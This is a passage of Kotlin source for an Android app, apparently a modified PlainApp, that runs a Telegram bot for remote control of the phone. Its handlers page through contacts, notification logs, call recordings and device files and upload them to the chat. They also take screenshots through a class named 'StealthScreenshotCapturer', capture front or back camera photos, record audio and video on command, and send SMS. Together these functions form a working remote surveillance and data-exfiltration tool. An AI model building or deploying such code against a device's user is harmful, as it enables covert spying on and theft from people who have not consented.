                // m.displayName holds the phone number; look it up in contacts to get the real name
                val contactName = lookupContactName(m.displayName)
                val nameDisplay = contactName.ifBlank { m.displayName }
                val rowIndex = offset + i + 1
                sb.append("${rowIndex}. $dirEmoji")
                if (contactName.isNotBlank()) {
                    sb.append(" <b>${htmlEsc(contactName)}</b>")
                    if (m.displayName.isNotBlank()) sb.append("\n   📱 <code>${htmlEsc(m.displayName)}</code>")
                } else if (m.displayName.isNotBlank()) {
                    sb.append(" <b>${htmlEsc(m.displayName)}</b>")
                }
                sb.append("\n   ⏱ $dur  ·  📦 ${m.sizeBytes / 1024} KB")
                sb.append("\n   🕐 ${fmtTime(m.startedAt)}")
                if (m.source != "unknown") sb.append("  ·  <i>${htmlEsc(m.source.ifBlank { m.appName })}</i>")
                sb.append("\n\n")
                val tok = recToken(m.filename)
                rows.add(listOf(
                    "📥 ${rowIndex}. ${nameDisplay.take(16)} · $dur" to "rec_get:${m.filename.take(50)}",
                    "🗑 Delete" to "rec_del:$tok",
                ))
            }
            val q = if (query.isEmpty()) "_" else query
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "rec_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "rec_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search" to "rec_q", "🔄 Refresh" to "rec_pg:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read recordings: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    /** Last list state, used so the contact-detail "Back to list" button restores the right page. */
    @Volatile private var lastContactsQuery: String = ""
    @Volatile private var lastContactsOffset: Int = 0
    @Volatile private var lastMessagesQuery: String = ""
    @Volatile private var lastCallsQuery: String = ""
    @Volatile private var lastNotifQuery: String = ""

    private suspend fun cmdContacts(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderContactsPage(query, 0, editMessageId = null)
    }

    private suspend fun renderContactsPage(query: String, offset: Int, editMessageId: Long?) {
        lastContactsQuery = query
        lastContactsOffset = offset
        try {
            val pageSize = 20
            // Android's Contacts provider does not honour QUERY_ARG_OFFSET reliably on
            // Android 11+, so paging with a non-zero offset would just return the same
            // first page over and over. We fetch up to (offset + pageSize + 1) rows from
            // offset 0 and slice client-side, matching the working /files paging pattern.
            val fetchCap = offset + pageSize + 1
            val all = ContactMediaStoreHelper.searchAsync(MainApp.instance, query, fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "👥 No contacts found." else "👥 No more contacts."
                if (editMessageId != null) {
                    TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                } else sendMessage(msg)
                return
            }
            val title = if (query.isEmpty()) "👥 <b>Contacts</b>" else "👥 <b>Contacts</b> · <i>${htmlEsc(query.removePrefix("text:"))}</i>"
            val sb = StringBuilder("$title  ·  Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a contact to call, message, or share.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, c ->
                val display = contactDisplayName(c)
                val firstPhone = c.phoneNumbers.firstOrNull()?.value
                val previewPhone = if (firstPhone != null) "  ·  📞 ${htmlEsc(firstPhone)}" else ""
                sb.append("${offset + i + 1}. 👤 <b>${htmlEsc(display)}</b>$previewPhone\n")
                if (c.organization != null && c.organization!!.company.isNotBlank()) {
                    sb.append("   🏢 ${htmlEsc(c.organization!!.company)}\n")
                }
                // 1-button row per contact = clean modern list
                val q = query.ifEmpty { "_" }
                val btnLabel = "${offset + i + 1}. ${display.take(28)}"
                rows.add(listOf(btnLabel to "c_view:${c.id}:$q:$offset"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val q = query.ifEmpty { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "contacts_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "contacts_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search contacts" to "contacts_q", "🔄 Refresh" to "contacts_pg:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) {
                TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            } else {
                sendMessage(sb.toString(), replyMarkup = markup)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not read contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdNotifications(args: List<String>) {
        val queryArg = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastNotifQuery = queryArg
        renderNotificationsPage(queryArg, editMessageId = null)
    }

    private fun renderNotificationsPage(query: String, editMessageId: Long?) {
        lastNotifQuery = query
        val limit = 50
        val all = NotificationLogHelper.all().reversed()
        val filtered = if (query.isEmpty()) all else all.filter { n ->
            n.appName.contains(query, ignoreCase = true) ||
            n.title?.contains(query, ignoreCase = true) == true ||
            n.body?.contains(query, ignoreCase = true) == true
        }
        val list = filtered.take(limit)
        val qLabel = if (query.isNotEmpty()) " · search: <i>${htmlEsc(query)}</i>" else ""
        if (list.isEmpty()) {
            val msg = "🔔 No notifications found$qLabel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        val sb = StringBuilder("🔔 <b>Recent Notifications</b>$qLabel (${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. 📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 <b>${htmlEsc(n.title.take(80))}</b>\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(150))}\n")
            sb.append("   🕐 ${fmtTime(n.time.toEpochMilliseconds())}\n\n")
            if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
        }
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("🔍 Search notifications" to "notif_q", "🔄 Refresh" to "notif_refresh"),
        ))
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    /**
     * Toggle the auto-forwarding of incoming Android notifications to this Telegram chat.
     *
     * `/mutenotifs`        — flips the current state
     * `/mutenotifs on`     — silences forwards (notifications still get logged on the device)
     * `/mutenotifs off`    — resumes forwards immediately
     *
     * Only the bot stream is affected — the device keeps logging notifications normally
     * and `/notifications` / `/logs` still work as before.
     */
    private fun cmdMuteNotifs(args: List<String>) {
        val arg = args.firstOrNull()?.lowercase()
        val newMuted = when (arg) {
            "on", "1", "true", "yes", "mute" -> true
            "off", "0", "false", "no", "unmute" -> false
            null, "" -> forwardNotifications  // no arg → flip current state
            else -> {
                sendMessage("❓ Use <code>/mutenotifs on</code> to silence, <code>/mutenotifs off</code> to resume, or <code>/mutenotifs</code> alone to toggle.")
                return
            }
        }
        forwardNotifications = !newMuted
        if (newMuted) {
            sendMessage(
                "🔕 <b>Notification forwarding muted.</b>\n" +
                "I'll stop pushing 🔔 alerts to this chat until you send <code>/mutenotifs off</code>.\n" +
                "<i>Your phone keeps receiving them as usual — only this Telegram stream is paused.</i>",
                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                    listOf("🔔 Resume forwards" to "notif_unmute"),
                ))
            )
        } else {
            sendMessage(
                "🔔 <b>Notification forwarding resumed.</b>\n" +
                "New device notifications will appear here again.",
                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                    listOf("🔕 Mute again" to "notif_mute"),
                ))
            )
        }
    }

    private fun cmdLogs(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 30, 200)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("📋 No notification logs."); return }
        val sb = StringBuilder("📋 <b>Notification Log</b> (last ${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. <b>${htmlEsc(n.appName)}</b> · ${fmtTime(n.time.toEpochMilliseconds())}\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 ${htmlEsc(n.title.take(60))}\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(100))}\n")
            sb.append("\n")
            if (sb.length > 3600) { sb.append("…truncated (${list.size - i - 1} more)"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    /** Stable short-token cache so long paths fit Telegram's 64-byte callback_data limit. */
    /** Holds a one-shot pending-input action keyed for the only authorised chat (single-chat bot). */
    @Volatile private var pendingInput: String? = null

    private val pathTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pathToken(path: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(path.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pathTokens[hex] = path
        return hex
    }
    private fun pathFromToken(token: String): String? = pathTokens[token]

    /** Phone-number tokens — keeps callback_data short and avoids escaping issues with +, spaces, etc. */
    private val phoneTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun phoneToken(num: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(num.toByteArray()).joinToString("") { "%02x".format(it) }.take(10)
        phoneTokens[hex] = num
        return hex
    }
    private fun phoneFromToken(t: String): String? = phoneTokens[t]

    /** Recording-filename tokens — keeps callback_data short (filenames can exceed 64-byte limit). */
    private val recTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun recToken(filename: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(filename.toByteArray()).joinToString("") { "%02x".format(it) }.take(10)
        recTokens[hex] = filename
        return hex
    }
    private fun recFromToken(t: String): String? = recTokens[t]

    /** Look up a contact display name for a given phone number via ContactsContract.PhoneLookup. */
    private fun lookupContactName(number: String): String {
        if (number.isBlank()) return ""
        val uri = android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI
            .buildUpon().appendPath(number).build()
        return try {
            MainApp.instance.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) cursor.getString(0) ?: "" else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    private fun cmdFiles(args: List<String>) {
        val path = if (args.isNotEmpty()) args.joinToString(" ") else defaultStorageRoot()
        scope.launch { renderFolderPage(path, offset = 0, editMessageId = null) }
    }

    private fun defaultStorageRoot(): String {
        val ext = android.os.Environment.getExternalStorageDirectory()
        return if (ext != null && ext.exists()) ext.absolutePath else "/sdcard"
    }

    private fun renderFolderPage(path: String, offset: Int, editMessageId: Long?) {
        try {
            val dir = File(path)
            if (!dir.exists()) {
                val msg = "❌ Path not found: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            if (!dir.isDirectory) { renderFileView(path, editMessageId); return }
            val items = try {
                dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            } catch (_: SecurityException) { null }
            if (items == null) {
                val msg = "⛔ Permission denied: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }

            val pageSize = 12
            val total = items.size
            val pageItems = items.drop(offset).take(pageSize)
            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b>\n")
            sb.append("<i>${total} items · tap a folder to open, a file to view & download.</i>\n")
            if (total > pageSize) sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, f ->
                val idx = offset + i + 1
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val sizeText = if (f.isFile) "${humanSize(f.length())}" else "${try { f.listFiles()?.size ?: 0 } catch (_: SecurityException) { 0 }} items"
                sb.append("${idx}. $icon <code>${htmlEsc(f.name.take(60))}</code> · $sizeText\n")
                val tok = pathToken(f.absolutePath)
                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
                val label = "$icon ${idx}. ${f.name.take(28)}"
                rows.add(listOf(label to cb))
            }

            // Navigation row(s)
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "files_pg:${pathToken(path)}:${(offset - pageSize).coerceAtLeast(0)}")
            val parent = dir.parentFile?.absolutePath
            if (parent != null && parent != path) nav.add("⬆️ Up" to "files_pg:${pathToken(parent)}:0")
            if (offset + pageSize < total) nav.add("Next ▶️" to "files_pg:${pathToken(path)}:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            // Quick-jump shortcuts when at the default root with empty parent only
            if (offset == 0 && parent == null) {
                rows.add(listOf("🏠 /sdcard" to "files_pg:${pathToken("/sdcard")}:0"))
            }
            rows.add(listOf("🔍 Search files" to "files_q:${pathToken(path)}"))

            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Error: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun renderFileView(path: String, editMessageId: Long?) {
        val f = File(path)
        if (!f.exists()) {
            val msg = "❌ File not found: <code>${htmlEsc(path)}</code>"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        if (f.isDirectory) { renderFolderPage(path, 0, editMessageId); return }
        val parent = f.parentFile?.absolutePath ?: "/"
        val sizeBytes = f.length()
        val sb = StringBuilder()
        sb.append("📄 <b>${htmlEsc(f.name)}</b>\n\n")
        sb.append("📁 <code>${htmlEsc(parent)}</code>\n")
        sb.append("💾 ${humanSize(sizeBytes)}  (${sizeBytes} bytes)\n")
        sb.append("🕐 Modified: ${fmtTime(f.lastModified())}\n")
        sb.append("🔧 Readable: ${if (f.canRead()) "yes" else "no"}\n")
        if (sizeBytes > UPLOAD_LIMIT_BYTES) {
            sb.append("\n⚠️ <i>File is larger than ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB — Telegram bot uploads are capped at this size.</i>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (f.canRead() && sizeBytes <= UPLOAD_LIMIT_BYTES && sizeBytes > 0) {
            rows.add(listOf("📥 Download original" to "file_get:${pathToken(path)}"))
        }
        rows.add(listOf("⬆️ Back to folder" to "files_pg:${pathToken(parent)}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    /** Recursively search for files matching [query] under [root]. Returns up to [max] results. */
    private fun searchFilesRecursive(root: File, query: String, max: Int): List<File> {
        val results = mutableListOf<File>()
        fun walk(dir: File) {
            if (results.size >= max) return
            val entries = try { dir.listFiles() ?: return } catch (_: SecurityException) { return }
            for (f in entries) {
                if (results.size >= max) return
                if (f.name.contains(query, ignoreCase = true)) results.add(f)
                if (f.isDirectory) walk(f)
            }
        }
        walk(root)
        return results
    }

    private fun renderFileSearchResults(rootPath: String, query: String, editMessageId: Long?) {
        try {
            val root = File(rootPath)
            val hits = searchFilesRecursive(root, query, 30)
            val sb = StringBuilder("🔍 <b>File Search</b> · <i>${htmlEsc(query)}</i> in <code>${htmlEsc(rootPath)}</code>\n")
            if (hits.isEmpty()) {
                sb.append("\nNo files found matching <i>${htmlEsc(query)}</i>.")
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString())
                else sendMessage(sb.toString())
                return
            }
            sb.append("Found ${hits.size} result(s) (top 30)\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            hits.forEachIndexed { i, f ->
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val size = if (f.isFile) " · ${humanSize(f.length())}" else ""
                sb.append("${i + 1}. $icon <code>${htmlEsc(f.absolutePath.take(80))}</code>$size\n")
                val tok = pathToken(f.absolutePath)
                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
                rows.add(listOf("$icon ${(i + 1)}. ${f.name.take(28)}" to cb))
            }
            rows.add(listOf("📂 Back to folder" to "files_pg:${pathToken(rootPath)}:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Search failed: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private suspend fun cbSendFile(path: String) {
        try {
            val f = File(path)
            if (!f.exists() || !f.isFile) { sendMessage("❌ File no longer exists: <code>${htmlEsc(path)}</code>"); return }
            if (!f.canRead()) { sendMessage("⛔ Not readable: <code>${htmlEsc(path)}</code>"); return }
            if (f.length() > UPLOAD_LIMIT_BYTES) {
                sendMessage("⚠️ File too large for Telegram (${humanSize(f.length())} > ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB).")
                return
            }
            sendUploadDocument()
            val caption = "📄 ${htmlEsc(f.name)} · ${humanSize(f.length())}"
            val ok = TelegramApiClient.sendDocument(token, chatId, f, caption)
            if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Could not send file: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Render an installed app's launcher icon to a temp PNG and upload it to
     * Telegram with a caption naming the package. Used by the /apps action menu.
     */
    private suspend fun sendAppIcon(pkg: String) {
        try {
            val info = PackageHelper.searchAsync(
                "ids:$pkg", 1, 0,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
            ).firstOrNull()
            if (info == null) { sendMessage("❌ App not found: <code>${htmlEsc(pkg)}</code>"); return }
            val bmp = try {
                PackageHelper.getIcon(pkg)
            } catch (e: Exception) {
                sendMessage("❌ No icon available for <code>${htmlEsc(pkg)}</code>: ${htmlEsc(e.message ?: "")}")
                return
            }
            val tmp = File.createTempFile("appicon_", ".png", MainApp.instance.cacheDir)
            tmp.outputStream().use { bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, it) }
            val ok = TelegramApiClient.sendPhoto(token, chatId, tmp, "🖼 ${htmlEsc(info.name)}\n<code>${htmlEsc(pkg)}</code>")
            tmp.delete()
            if (!ok) sendMessage("❌ Failed to upload icon for <code>${htmlEsc(pkg)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Icon error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun humanSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return "%.1f KB".format(kb)
        val mb = kb / 1024.0
        if (mb < 1024) return "%.1f MB".format(mb)
        return "%.2f GB".format(mb / 1024.0)
    }

    /** Telegram bot API document upload limit. */
    private val UPLOAD_LIMIT_BYTES = 50L * 1024L * 1024L

    private suspend fun cmdScreenshot() {
        sendMessage("📸 Taking screenshot…")
        sendUploadPhoto()
        try {
            val shot = StealthScreenshotCapturer.captureNow(manual = true)
            if (shot == null) {
                sendMessage("❌ Screenshot failed. Ensure Accessibility Service is enabled in PlainApp settings.")
                return
            }
            val file = File(shot.absPath)
            if (!file.exists()) { sendMessage("❌ Screenshot file not found."); return }
            val caption = "📸 Screenshot · ${shot.width}×${shot.height} · ${shot.sizeBytes / 1024} KB · ${ts}"
            TelegramApiClient.sendPhoto(token, chatId, file, caption)
        } catch (e: Exception) {
            sendMessage("❌ Screenshot error: ${htmlEsc(e.message ?: "")}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun cmdPhoto(args: List<String>) {
        val useFront = args.firstOrNull()?.lowercase() == "front"
        sendMessage("📷 Capturing ${if (useFront) "front" else "back"} camera photo…")
        sendUploadPhoto()
        val file = capturePhoto(MainApp.instance, useFront)
        if (file != null) {
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 ${if (useFront) "Front" else "Back"} camera · ${ts}")
            file.delete()
        } else {
            sendMessage("❌ Photo capture failed. Ensure Camera permission is granted.")
        }
    }

    private fun cmdAudio(args: List<String>) {
        // Backwards compat: `/audio 30` immediately starts a 30s recording.
        val direct = args.firstOrNull()?.toIntOrNull()
        if (direct != null) {
            scope.launch { runAudioRecording(direct.coerceIn(1, 300)) }
            return
        }
        showAudioDurationMenu(editMessageId = null)
    }

    private fun showAudioDurationMenu(editMessageId: Long?) {
        val text = "🎙 <b>Record audio</b>\n\nChoose a duration:"
        val rows = listOf(
            listOf("5s" to "aud:5", "10s" to "aud:10", "30s" to "aud:30"),
            listOf("1 min" to "aud:60", "2 min" to "aud:120", "5 min" to "aud:300"),
            listOf("⌨️ Custom…" to "aud:custom"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runAudioRecording(seconds: Int) {
        sendMessage("🎙 Recording ${seconds}s of audio…")
        sendRecordVoice()
        val file = recordAudio(MainApp.instance, seconds)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendAudio(token, chatId, file, "🎙 Audio · ${seconds}s · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Audio recording failed. Ensure Microphone permission is granted.")
        }
    }

    private fun cmdVideo(args: List<String>) {
        // Backwards compat: `/video 20 front` or `/video 20`.
        val firstNum = args.firstOrNull()?.toIntOrNull()
        if (firstNum != null) {
            val useFront = args.getOrNull(1)?.lowercase() == "front"
            scope.launch { runVideoRecording(firstNum.coerceIn(1, 120), useFront) }
            return
        }
        // `/video front` or `/video back` → skip camera picker, go straight to durations.
        val directCam = args.firstOrNull()?.lowercase()
        if (directCam == "front" || directCam == "back") {
            showVideoDurationMenu(useFront = directCam == "front", editMessageId = null)
            return
        }
        showVideoCameraMenu(editMessageId = null)
    }

    private fun showVideoCameraMenu(editMessageId: Long?) {
        val text = "🎬 <b>Record video</b>\n\nWhich camera?"
        val rows = listOf(
            listOf("📷 Back" to "vid_cam:back", "🤳 Front" to "vid_cam:front"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private fun showVideoDurationMenu(useFront: Boolean, editMessageId: Long?) {
        val cam = if (useFront) "front" else "back"
        val label = if (useFront) "🤳 Front" else "📷 Back"
        val text = "🎬 <b>Record video</b> · $label camera\n\nChoose a duration:"
        val rows = listOf(
            listOf("5s" to "vid:$cam:5", "10s" to "vid:$cam:10", "20s" to "vid:$cam:20"),
            listOf("30s" to "vid:$cam:30", "1 min" to "vid:$cam:60", "2 min" to "vid:$cam:120"),
            listOf("⌨️ Custom…" to "vid_custom:$cam"),
            listOf("◀️ Change camera" to "vid_cam_pick"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runVideoRecording(seconds: Int, useFront: Boolean) {
        sendMessage("🎬 Recording ${seconds}s video (${if (useFront) "front" else "back"} camera)…")
        sendUploadVideo()
        val file = recordVideo(MainApp.instance, seconds, useFront)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendVideo(token, chatId, file, "🎬 Video · ${seconds}s · ${if (useFront) "front" else "back"} camera · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Video recording failed. Ensure Camera & Microphone permissions are granted.")
        }
    }

    private suspend fun consumePendingInput(action: String, text: String) {
        val parts = action.split(":")
        when (parts[0]) {
            "audio_duration" -> {
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..300) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 300, e.g. <code>45</code>.\nSend /audio to start over.")
                    return
                }
                runAudioRecording(n)
            }
            "video_duration" -> {
                val cam = parts.getOrNull(1) ?: "back"
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..120) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 120, e.g. <code>45</code>.\nSend /video to start over.")
                    return
                }
                runVideoRecording(n, useFront = cam == "front")
            }
            "appsearch" -> {
                val q = text.trim()
                lastAppsQuery = if (q == "*" || q.isEmpty()) "" else q
                renderAppsPickerPage(lastAppsQuery, offset = 0, editMessageId = null)
                return
            }
            "contacts_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else "text:$q"
                renderContactsPage(query, 0, editMessageId = null)
                return
            }
            "messages_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderMessagesPage(query, editMessageId = null)
                return
            }
            "calls_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderCallsPage(query, 0, editMessageId = null)
                return
            }
            "notif_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderNotificationsPage(query, editMessageId = null)
                return
            }
            "files_search" -> {
                val pathTok = parts.getOrNull(1) ?: ""
                val rootPath = if (pathTok.isNotEmpty()) pathFromToken(pathTok) ?: defaultStorageRoot() else defaultStorageRoot()
                val q = text.trim()
                if (q.isEmpty() || q == "*") {
                    renderFolderPage(rootPath, 0, editMessageId = null)
                } else {
                    renderFileSearchResults(rootPath, q, editMessageId = null)
                }
                return
            }
            "blockapp_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderAppPickerForBlock(query, 0, editMessageId = null)
                return
            }
            "rec_search" -> {
                val q = text.trim()
                val query = if (q == "*" || q.isEmpty()) "" else q
                renderRecordingsPage(query, 0, editMessageId = null)
                return
            }
            "bn_add_num" -> {
                val num = text.trim()
                if (num.isBlank()) { sendMessage("❌ Please send a valid phone number."); return }
                try {
                    BlockedNumberHelper.add(num)
                    sendMessage("✅ <code>${htmlEsc(num)}</code> is now blocked.")
                } catch (e: Exception) {
                    sendMessage("❌ Could not block number: ${htmlEsc(e.message ?: "")}")
                }
                return
            }
            "sms_to" -> {
                val tok = parts.getOrNull(1) ?: return
                val num = phoneFromToken(tok)
                if (num.isNullOrBlank()) {
                    sendMessage("⚠️ Number expired. Open the contact again and tap 💬 SMS.")
                    return
                }
                val body = text.trim()
                if (body.isEmpty()) {
                    sendMessage("❌ Empty message — nothing was sent.")
                    return
                }
                try {
                    SmsHelper.sendText(num, body)
                    sendMessage("✅ SMS sent to <code>${htmlEsc(num)}</code>:\n<i>${htmlEsc(body)}</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
                }
            }
            "save_contact" -> {
                val tok = parts.getOrNull(1) ?: return
                val num = phoneFromToken(tok)
                if (num.isNullOrBlank()) {
                    sendMessage("⚠️ Number expired. Send /find <number> again.")
                    return
                }
                val name = text.trim()
                if (name.isEmpty()) {
                    sendMessage("❌ Empty name — nothing was saved.")
                    return
                }
                try {
                    val newId = saveQuickContactAsync(name, num)
                    if (newId.isBlank()) {
                        sendMessage("❌ Could not save contact (no available account).")
                    } else {
                        sendMessage("✅ <b>Saved</b> ${htmlEsc(name)} · <code>${htmlEsc(num)}</code>\n<i>Tap below to open the contact.</i>",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                                listOf("👤 Open contact" to "c_view:$newId"),
                            )))
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not save contact: ${htmlEsc(e.message ?: "")}")
                }
            }
            "note_create" -> {
                val raw = text.trim()
                if (raw.isEmpty()) { sendMessage("❌ Empty note — nothing saved."); return }
                val (title, body) = if (raw.contains('\n')) {
                    val nl = raw.indexOf('\n')
                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
                } else {
                    val short = raw.take(60)
                    short to raw
                }
                try {
                    val n = NoteHelper.addOrUpdateAsync("") {
                        this.title = title
                        this.content = body
                    }
                    sendMessage("✅ <b>Note saved</b>\n📝 <b>${htmlEsc(title)}</b>\n<i>id: <code>${n.id.take(8)}</code></i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not save note: ${htmlEsc(e.message ?: "")}")
                }
            }
            "bookmark_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full URL starting with http:// or https://")
                    return
                }
                try {
                    val list = BookmarkHelper.addBookmarks(listOf(url))
                    val b = list.firstOrNull()
                    if (b != null) {
